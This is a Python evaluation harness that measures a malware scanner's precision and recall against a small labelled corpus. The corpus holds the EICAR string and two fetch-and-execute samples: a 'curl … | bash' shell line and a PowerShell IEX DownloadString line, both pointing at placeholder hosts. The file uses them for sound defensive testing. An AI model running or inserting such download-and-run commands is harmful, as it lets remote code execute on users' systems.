"""
Detection evaluation harness — measures how well the scanner actually performs.

Builds a small *labeled* corpus (known-bad and known-good files), scans it, and
reports a confusion matrix plus precision / recall / accuracy. This is the honest
way to talk about a detector: not "it works" but "on N samples it caught X% of
threats with a Y% false-positive rate".

Every malicious sample is harmless to your machine — EICAR strings and benign
heuristic triggers (a `curl | bash` line, high-entropy bytes). Nothing executes.

Run it:  python main.py eval
"""

import tempfile
import zipfile
from pathlib import Path

from modules import scanner

# Each entry: (filename, byte content, label)  where label is "bad" or "good".
def build_corpus(root: Path) -> list[tuple[Path, str]]:
    samples: list[tuple[bytes | str, str, str]] = [
        # ── malicious / suspicious (label: bad) ───────────────────────────
        ("eicar.txt", scanner.EICAR, "bad"),
        ("eicar.com", scanner.EICAR, "bad"),
        ("dropper.sh", "#!/bin/sh\ncurl http://x.test/p | bash\n", "bad"),
        ("loader.ps1",
         "New-Object Net.WebClient; IEX(x.DownloadString('http://x/y'))", "bad"),
        ("packed.exe", __import__("os").urandom(40000), "bad"),
        # ── benign (label: good) ──────────────────────────────────────────
        ("notes.txt", "shopping list: milk, bread, coffee", "good"),
        ("script.sh", "#!/bin/sh\necho 'building project'\nmake all\n", "good"),
        ("config.json", '{"theme": "dark", "volume": 70}', "good"),
        ("data.bin", __import__("os").urandom(40000), "good"),  # high entropy, safe ext
        ("readme.md", "# My Project\nA small tool.\n", "good"),
    ]

    written: list[tuple[Path, str]] = []
    for name, content, label in samples:
        p = root / name
        p.write_bytes(content.encode() if isinstance(content, str) else content)
        written.append((p, label))

    # One archived threat: EICAR inside a zip (label: bad).
    zp = root / "bundle.zip"
    with zipfile.ZipFile(zp, "w") as z:
        z.writestr("inner/evil.txt", scanner.EICAR)
    written.append((zp, "bad"))

    # One clean archive (label: good).
    cz = root / "clean.zip"
    with zipfile.ZipFile(cz, "w") as z:
        z.writestr("inner/ok.txt", "nothing here")
    written.append((cz, "good"))

    return written


def evaluate() -> dict:
    sigs = scanner.load_signatures()
    yara_on = sigs.get("yara") is not None

    with tempfile.TemporaryDirectory() as tmp:
        corpus = build_corpus(Path(tmp))
        tp = fp = tn = fn = 0
        rows = []
        for path, label in corpus:
            res = scanner.scan_file(path, sigs)
            flagged = res["verdict"] in ("malicious", "suspicious")
            if label == "bad" and flagged:
                tp += 1; outcome = "TP"
            elif label == "bad" and not flagged:
                fn += 1; outcome = "FN ← missed!"
            elif label == "good" and flagged:
                fp += 1; outcome = "FP ← false alarm!"
            else:
                tn += 1; outcome = "TN"
            rows.append((path.name, label, res["verdict"], outcome))

    precision = tp / (tp + fp) if (tp + fp) else 1.0
    recall = tp / (tp + fn) if (tp + fn) else 1.0
    accuracy = (tp + tn) / len(corpus)
    f1 = (2 * precision * recall / (precision + recall)
          if (precision + recall) else 0.0)

    return {"rows": rows, "tp": tp, "fp": fp, "tn": tn, "fn": fn,
            "precision": precision, "recall": recall, "accuracy": accuracy,
            "f1": f1, "n": len(corpus), "yara": yara_on}


def run():
    m = evaluate()
    print(f"\n  Evaluation corpus: {m['n']} labeled samples "
          f"(YARA {'on' if m['yara'] else 'off'})\n")
    print(f"  {'file':<14}{'label':<7}{'verdict':<12}outcome")
    print(f"  {'-'*13:<14}{'-'*6:<7}{'-'*11:<12}{'-'*16}")
    for name, label, verdict, outcome in m["rows"]:
        print(f"  {name:<14}{label:<7}{verdict:<12}{outcome}")

    print("\n  ── Confusion matrix ────────────────────")
    print(f"    True positives  (caught threats) : {m['tp']}")
    print(f"    False negatives (missed threats) : {m['fn']}")
    print(f"    True negatives  (clean cleared)  : {m['tn']}")
    print(f"    False positives (false alarms)   : {m['fp']}")

    print("\n  ── Metrics ─────────────────────────────")
    print(f"    Precision : {m['precision']:.1%}   (of flagged, how many were real)")
    print(f"    Recall    : {m['recall']:.1%}   (of threats, how many we caught)")
    print(f"    Accuracy  : {m['accuracy']:.1%}")
    print(f"    F1 score  : {m['f1']:.3f}")
    return m


if __name__ == "__main__":
    run()
